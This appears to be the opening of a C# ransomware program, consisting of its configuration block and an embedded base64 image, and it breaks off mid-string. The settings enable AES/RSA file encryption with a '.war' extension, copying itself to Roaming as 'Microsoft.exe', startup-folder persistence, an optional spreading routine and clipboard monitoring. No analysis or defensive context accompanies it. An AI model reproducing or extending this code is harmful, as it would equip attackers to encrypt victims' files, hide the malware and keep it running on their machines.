using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "war";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "Microsoft.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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